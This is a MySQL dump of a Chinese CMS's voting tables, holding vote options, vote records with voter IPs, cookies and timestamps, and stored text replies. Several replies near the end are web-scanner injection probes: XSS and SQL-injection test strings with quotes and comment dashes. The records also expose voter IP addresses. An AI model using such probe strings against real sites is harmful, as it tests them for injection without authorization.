INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (19,2,'图库',76,9,16,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (20,2,'新闻',80,8,16,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (21,2,'下载',72,11,16,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (22,2,'视频',72,10,16,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (26,3,'5000',0,2,18,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (27,3,'10000',1,3,18,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (28,3,'3000',0,1,18,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (33,4,'4号',0,4,20,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (34,4,'2号',0,2,20,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (35,4,'1号',0,1,20,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (36,4,'3号',0,3,20,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (37,5,'1号',0,1,21,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (38,5,'2号',0,2,21,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (39,5,'3号',0,3,21,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (40,5,'4号',0,4,21,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (41,6,'张',0,1,22,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (42,6,'李',0,2,22,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (43,6,'陈',0,3,22,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (44,6,'王',0,4,22,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (45,7,'赵',0,1,23,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (46,7,'孙',0,2,23,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (47,7,'姚',0,3,23,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (48,7,'黄',0,4,23,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (49,8,'钱',0,1,24,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (50,8,'周',0,2,24,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (51,8,'郑',0,3,24,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (52,8,'胡',0,4,24,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (53,9,'南大',0,1,25,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (54,9,'财大',0,2,25,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (55,9,'师大',0,3,25,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (56,9,'农大',0,4,25,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (57,10,'很尽兴',37,1,26,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (58,10,'还行',0,2,26,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (59,10,'没玩够',0,3,26,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (60,10,'家里蹲',0,4,26,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (61,11,'赞成',16,1,27,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (62,11,'反对',0,2,27,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (63,11,'对我不影响',0,3,27,'');

#
# Source for table jc_vote_record
#

CREATE TABLE `jc_vote_record` (
  `voterecored_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `votetopic_id` int(11) NOT NULL,
  `vote_time` datetime NOT NULL COMMENT '投票时间',
  `vote_ip` varchar(50) NOT NULL COMMENT '投票IP',
  `vote_cookie` varchar(32) NOT NULL COMMENT '投票COOKIE',
  `wx_open_id` varchar(50) DEFAULT NULL COMMENT '微信投票者openId',
  PRIMARY KEY (`voterecored_id`),
  KEY `fk_jc_vote_record_topic` (`votetopic_id`),
  KEY `fk_jc_voterecord_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=81 DEFAULT CHARSET=utf8 COMMENT='CMS投票记录';

#
# Dumping data for table jc_vote_record
#

INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (1,NULL,3,'2016-09-30 14:57:46','117.40.115.55','85c62d7bc19b436dbb8dd21edc2ebfd5',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (2,NULL,11,'2016-10-09 11:38:05','117.41.153.171','d2c045570d544b99885cb8f3fef658d2',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (3,NULL,10,'2016-10-10 14:30:05','117.41.152.66','837d951f500c4671bd353d0d3ebadbfa',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (4,NULL,11,'2016-10-10 14:30:05','117.41.152.66','fc848a92556a4c559f79f02ca04a9ffa',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (5,NULL,11,'2016-10-10 16:00:55','117.41.152.66','0bf2c8f72d94473db38bd95ebaefcdfd',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (8,NULL,11,'2016-10-10 16:00:56','117.41.152.66','b22d8d1d813f4bc2b4e4c665c4e615fa',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (9,NULL,11,'2016-10-10 16:00:56','117.41.152.66','88db248d9fe147f6897671de3fb568f9',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (12,NULL,11,'2016-10-10 16:00:56','117.41.152.66','465da02a13fc4f7fa2b72781d7bbf8e1',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (14,NULL,11,'2016-10-10 16:00:56','117.41.152.66','c15529ef4ce245f781b64f7f2cb953bf',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (17,NULL,10,'2016-10-10 16:00:56','117.41.152.66','1ea33a4323994d89b4bcc873116e93be',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (19,NULL,11,'2016-10-10 16:00:57','117.41.152.66','4ad719ade7594ceaa1015e9bfc1b3f47',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (20,NULL,11,'2016-10-10 16:00:57','117.41.152.66','ff7f622c3a1c4529894de76c523b553c',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (21,NULL,11,'2016-10-10 16:00:57','117.41.152.66','36b4f3912f264a83b135486b34827d65',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (22,NULL,10,'2016-10-10 16:00:57','117.41.152.66','901cb03ec75145eeaf60702c1e3064d5',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (23,NULL,11,'2016-10-10 16:00:57','117.41.152.66','49b4dd1536e2467aad34d80bc1016efc',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (24,NULL,10,'2016-10-10 16:00:57','117.41.152.66','3759152aa2fc4036b46eaf58c70ac6b5',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (25,NULL,11,'2016-10-10 16:00:58','117.41.152.66','d8ae1822d8ad4203a88008815f15aa9b',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (26,NULL,10,'2016-10-10 16:00:58','117.41.152.66','e60dbfc647f54d2b86dd36ee4b541fc6',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (30,NULL,10,'2016-10-10 16:00:58','117.41.152.66','d78a0d8166be459b93a29b7d8c342371',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (31,NULL,11,'2016-10-10 16:00:58','117.41.152.66','207ccc615b7a410e87bb51c39adcbe60',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (32,NULL,10,'2016-10-10 16:00:58','117.41.152.66','bfc4dd4213424263a2790715649fecc9',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (34,NULL,10,'2016-10-10 16:00:58','117.41.152.66','df5764ee8165497b82c550f66ff9d8a5',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (35,NULL,11,'2016-10-10 16:00:59','117.41.152.66','962c03f30edb4cc4ba01e7397361bdc7',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (36,NULL,10,'2016-10-10 16:00:59','117.41.152.66','101593c1b84d48638958b7503d2f3659',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (38,NULL,10,'2016-10-10 16:00:59','117.41.152.66','8e3ea7a9bf4c442495f5a0ea05e31fd3',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (40,NULL,10,'2016-10-10 16:00:59','117.41.152.66','d55e04b63a85415f82b9e101e65593e0',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (41,NULL,10,'2016-10-10 16:00:59','117.41.152.66','a0fa6f6f3a8a49fab812cd7dc5e1a0f2',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (43,NULL,10,'2016-10-10 16:01:00','117.41.152.66','5b4e56ce66ea43e38640f1c3434d683e',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (44,NULL,10,'2016-10-10 16:01:00','117.41.152.66','f1502ea8feed44c9981428fba35e9aff',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (45,NULL,10,'2016-10-10 16:01:00','117.41.152.66','fb3dfceba790475fb563904b553fec91',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (46,NULL,10,'2016-10-10 16:01:00','117.41.152.66','eef4c07438f94622a2922ec015971c42',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (47,NULL,10,'2016-10-10 16:01:00','117.41.152.66','be507e426c2e4fdcb4e4dbcac6f925aa',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (48,NULL,10,'2016-10-10 16:01:00','117.41.152.66','a32b9c09af56456d8eadbc91c0e36632',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (50,NULL,10,'2016-10-10 16:01:01','117.41.152.66','d5c2cc42603c41e3968576b736118b62',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (51,NULL,10,'2016-10-10 16:01:01','117.41.152.66','fd79161c7c22486981d3ba0bcceb1500',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (53,NULL,10,'2016-10-10 16:01:01','117.41.152.66','9281df23008c40708f0a8e43341ac4ae',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (54,NULL,10,'2016-10-10 16:01:02','117.41.152.66','857782badf554f7fb1a3cd42ff1be708',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (55,NULL,10,'2016-10-10 16:01:02','117.41.152.66','6dfc50c459a34d669aed64847f7c6733',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (56,NULL,10,'2016-10-10 16:01:06','117.41.152.66','7163edffccd8453888abce6f95d7cfdd',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (57,NULL,10,'2016-10-10 16:01:06','117.41.152.66','472e57a5836f42d09c3afbb23552e4e3',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (58,NULL,10,'2016-10-10 16:01:07','117.41.152.66','17ebcb43eaba48f087c700d367b41692',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (59,NULL,10,'2016-10-10 16:01:07','117.41.152.66','727bdde2e94d4077b081959f4ca9a946',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (60,NULL,10,'2016-10-10 16:01:07','117.41.152.66','16d626ece9bd41aeb1300be3b9ea3ee0',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (61,NULL,10,'2016-10-10 16:01:08','117.41.152.66','8993e9dd5af34d3faf8dbcbf5c6494d6',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (62,NULL,10,'2016-10-10 16:01:08','117.41.152.66','bfda82a4d10f4d1b8d4e32e55200d07e',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (63,NULL,10,'2016-10-10 16:01:09','117.41.152.66','76ecfcc002b54d568a5f0d4f1ca20700',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (64,NULL,10,'2016-10-10 16:01:09','117.41.152.66','1ff84eab46d442daae3673ad2e831a54',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (65,NULL,10,'2016-10-10 16:01:10','117.41.152.66','0f39c2a605bf49c0a376879cd557ce01',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (66,NULL,10,'2016-10-10 16:01:10','117.41.152.66','cb44988a08b34af1bff99c1cb63b8b2d',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (67,NULL,10,'2016-10-10 16:01:11','117.41.152.66','4ba0635f7de14fe1b3a10de57d5783d4',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (68,NULL,10,'2016-10-10 16:01:11','117.41.152.66','0711f2524cf4451d954c6f94c4bf5099',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (69,NULL,10,'2016-10-10 16:01:12','117.41.152.66','5865796b06ee43af8f727c8f8f57ff94',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (70,NULL,10,'2016-10-10 16:01:12','117.41.152.66','ba8fa930a89d499ab4fbe4e0d565be10',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (71,NULL,10,'2016-10-10 16:01:13','117.41.152.66','e68f2e1dc3f94724bdc91b29bd3846bc',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (72,NULL,10,'2016-10-10 16:01:13','117.41.152.66','e574898d0d3f4313b2dd7e607e432d44',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (73,NULL,10,'2016-10-10 16:01:14','117.41.152.66','8c6f9de0ee764264bf0c3b105ccf4825',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (74,NULL,10,'2016-10-10 16:01:14','117.41.152.66','d73fc39a867d46459c5bb5d5b353933f',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (75,NULL,10,'2016-10-10 16:01:15','117.41.152.66','00fd7c694c2f4d18951b9feda39fec5d',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (76,NULL,11,'2016-10-10 16:01:39','117.41.152.66','869e55ac9e1548c7b95956d1083e7a83',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (77,NULL,10,'2016-10-10 16:01:40','117.41.152.66','5c9efcf72f784ec2948c34c660e11d26',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (78,NULL,11,'2016-10-10 16:01:41','117.41.152.66','222ebfd7010f4c69b971bbb388d2e3d0',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (79,NULL,11,'2016-10-10 16:01:42','117.41.152.66','0a9d43bc940f4b0786e981aa09ac3a67',NULL);
INSERT INTO `jc_vote_record` (`voterecored_id`,`user_id`,`votetopic_id`,`vote_time`,`vote_ip`,`vote_cookie`,`wx_open_id`) VALUES (80,NULL,10,'2016-10-10 16:01:43','117.41.152.66','160ba1860a52472bbfa17230f5cd1d99',NULL);

#
# Source for table jc_vote_reply
#

CREATE TABLE `jc_vote_reply` (
  `votereply_id` int(11) NOT NULL AUTO_INCREMENT,
  `reply` text COMMENT '回复内容',
  `subtopic_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`votereply_id`),
  KEY `FK_jc_vote_reply_sub` (`subtopic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=151 DEFAULT CHARSET=utf8 COMMENT='投票文本题目回复表';

#
# Dumping data for table jc_vote_reply
#

INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (1,'111',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (2,'111',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (3,'111',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (4,'111',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (5,'111',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (6,'111',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (7,'111',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (8,'111',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (9,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (10,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (11,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (12,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (13,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (14,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (15,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (16,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (17,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (18,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (19,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (20,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (21,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (22,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (23,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (24,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (25,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (26,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (27,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (28,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (29,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (30,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (31,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (32,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (33,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (34,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (35,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (36,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (37,'1234WFXSSProbe',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (38,'WF&＃39;SQL\"Probe;A--B',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (39,'1234&＃39;\"',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (40,'ProbePhishing',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (41,'A1234B',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (42,'1234WFXSSProbe&＃39;\"&＃41;/&gt;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (43,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (44,'1234',14);
